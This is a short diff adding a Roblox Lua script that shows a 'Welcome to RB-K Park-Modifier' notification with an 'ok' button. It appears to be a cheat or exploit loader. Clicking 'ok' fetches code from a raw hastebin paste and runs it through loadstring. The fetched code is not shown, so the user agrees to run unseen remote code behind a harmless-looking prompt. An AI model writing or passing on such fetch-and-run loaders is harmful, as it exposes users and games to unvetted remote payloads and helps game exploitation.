@@ -1,0 +1,16 @@
+local function callback(Text)
+ if Text == "ok" then
+loadstring(game:HttpGet("https://hastebin.com/raw/ubixajasiw"))()
+end
+end
+local NotificationBindable = Instance.new("BindableFunction")
+NotificationBindable.OnInvoke = callback
+--
+game.StarterGui:SetCore("SendNotification",  {
+ Title = "Welcome to \nRB-K Park-Modifier";
+ Text = "";
+ Icon = "rbxassetid://54460408";
+ Duration = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
+ Button1 = "ok";
+ Callback = NotificationBindable;
+})
